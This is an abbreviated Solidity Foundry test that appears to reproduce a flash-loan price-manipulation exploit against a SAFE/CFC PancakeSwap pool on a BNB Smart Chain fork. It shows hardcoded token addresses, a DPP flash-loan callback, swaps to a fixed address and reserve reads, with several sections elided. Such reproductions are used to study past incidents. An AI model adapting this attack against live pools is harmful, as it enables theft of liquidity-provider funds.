...
contract DCFTest is Test {
    IERC20 BEP20USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SAFE = IERC20(0xA7e92345ddF541Aa5CF60feE2a0e721C50Ca1adb);
    IERC20 CFC = IERC20(0x56f46bD073E9978Eb6984C0c3e5c661407c3A447);
    ...
    IPancakePair CakeLP = IPancakePair(payable(0x8487f846d59F8FB4f1285C64086b47e2626C01B6));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 44_290_970);
    ...
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            ...
            path[1] = address(SAFE);
            Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(13_000 * 1e18, 0, path, 0x16600100b04d17451a03575436B4090f6Ff8f404, block.timestamp + 100);

            (uint256 reserveSAFE, uint256 reserveCFC,) = CakeLP.getReserves();

            uint256 amountOut = Router.getAmountOut(SAFE.balanceOf(0x16600100b04d17451a03575436B4090f6Ff8f404), reserveSAFE, reserveCFC);
